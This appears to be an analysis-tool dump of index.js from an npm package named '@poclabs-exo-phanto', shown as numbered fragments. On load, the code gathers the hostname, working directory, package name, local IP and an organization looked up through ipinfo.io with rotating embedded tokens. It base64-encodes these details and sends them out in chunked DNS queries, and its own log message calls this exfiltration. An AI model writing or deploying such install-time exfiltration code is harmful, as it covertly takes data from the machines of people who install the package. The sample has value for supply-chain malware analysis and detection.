// File: tmp/tmpn6lsvf7x/@poclabs-exo-phanto/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 4: const path = require("path")
Line 5: const fs = require("fs")
Line 11: _tmp_7.push("e9334ba807050e1")
Line 12: _tmp_7.push("26ed3371fb48a1")
Line 13: _tmp_7.push("ca6b61c75a1ea9")
Line 14: _tmp_7.push("c8e4ba13f45cdc")
Line 19: {
    const token = IPINFO_TOKENS[currentTokenIndex];
    currentTokenIndex = (currentTokenIndex + 1) % IPINFO_TOKENS.length;
    return token;
}
Line 20: const token = IPINFO_TOKENS[currentTokenIndex]
Line 28: const mainFile = require.main.filename
Line 31: const packageData = JSON.parse(fs.readFileSync(packagePath, "utf-8"))
Line 42: path.join(directory, "package.json")
Line 55: getIPAddress()
Line 58: const data = {
        time: new Date().toISOString(),
        organization: organization || "Unknown",
        ip_address: ipAddress,
        package_name: getPackageName(), // Dynamically fetch the package name
        hostname: os.hostname(),
        current_path: process.cwd()
    }
Line 63: os.hostname()
Line 72: for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === "IPv4") {
                return iface.address;
            }
        }
    }
Line 73: for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === "IPv4") {
                return iface.address;
            }
        }
Line 85: getNextToken()
Line 86: <operator>.formatString("https://ipinfo.io/", ip, "?token=", token, "")
Line 88: (_tmp_4 = https.get(url, (res) => {
            let data = "";
            res.on("data", (chunk) => {
                data += chunk;
            });
            res.on("end", () => {
                try {
                    const response = JSON.parse(data);
                    resolve(response.org || "Unknown Organization");
                } catch (err) {
                    resolve("Unknown Organization");
                }
            });
        }))
Line 95: const response = JSON.parse(data)
Line 110: Buffer.from(jsonData).toString("base64")
Line 111: base64Data.match(/.{1,50}/g).join(".")
Line 120: dns.resolve4(query, (err) => {
        if (err) {
            console.error("Error sending DNS query:", err.message);
        } else {
            console.log("Exfiltration via DNS query successful.");
        }
    })
Line 130: sendData()
